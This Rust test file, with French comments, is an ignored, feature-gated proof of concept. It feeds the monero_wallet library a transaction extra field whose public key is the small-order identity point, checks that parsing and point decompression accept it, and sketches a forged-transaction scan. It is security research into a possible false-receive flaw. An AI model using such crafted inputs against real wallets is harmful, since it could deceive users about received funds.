#![cfg(feature = "poc_critical")]
//! Tentative d’escalade *Critical* : montrer qu'un tx_pubkey de petit ordre
//! traverse le parsing et peut mener à un résultat de scan incohérent.
//! Ce test est HORS CI (feature-gated) et marqué #[ignore] pour exécution manuelle.

use std::io::Cursor;
use monero_wallet::io::CompressedPoint;
use monero_wallet::extra::Extra;

// Si la lib expose un scanner haut niveau, adapte ces imports :
// use monero_wallet::{Scanner, ViewPair};
// use monero_wallet::address::{Address, Network};
// use monero_wallet::transaction::{Transaction /*, TxOut, ...*/};

fn compressed_identity() -> [u8; 32] {
    let mut id = [0u8; 32];
    id[0] = 1; // y = 1  => identité (petit ordre)
    id
}

#[test]
#[ignore = "exécuter manuellement pour la tentative Critical"]
fn false_receive_attempt() {
    // (1) Construire un Extra minimal: tag TX_PUBLIC_KEY (=0x01) + 32 octets (identité)
    let mut bytes = Vec::with_capacity(1 + 32);
    bytes.push(0x01);
    bytes.extend_from_slice(&compressed_identity());

    // (2) Parser via la lib
    let mut cur = Cursor::new(bytes);
    let extra = Extra::read(&mut cur).expect("parse extra");

    // (3) Vérifier que la clé est exposée malgré son petit ordre
    let (tx_keys, additional) = extra.keys().expect("Some(keys)");
    assert_eq!(tx_keys.len(), 1);
    assert!(additional.is_none() || additional.as_ref().unwrap().is_empty());

    // (4) Ancrage: l'identité se décompresse => point de torsion accepté
    let cp = CompressedPoint::from(compressed_identity());
    assert!(cp.decompress().is_some(), "identity decompresses");

    // (5) Optionnel (décommente si API disponible) : tenter un vrai scan
    // let addr = Address::from_spend_view([42u8;32], [77u8;32], Network::Mainnet);
    // let vp   = ViewPair::from_private([5u8;32], [42u8;32]).expect("view pair");
    // let mut scanner = Scanner::new(&vp);
    // let fake_tx = Transaction { /* construire une tx minimale + ce `extra` */ };
    // let outs = scanner.scan_transaction(&fake_tx).expect("scan ok");
    // assert!(outs.is_empty(), "si non vide => suspicion de faux positif (documentez le chemin)");
}
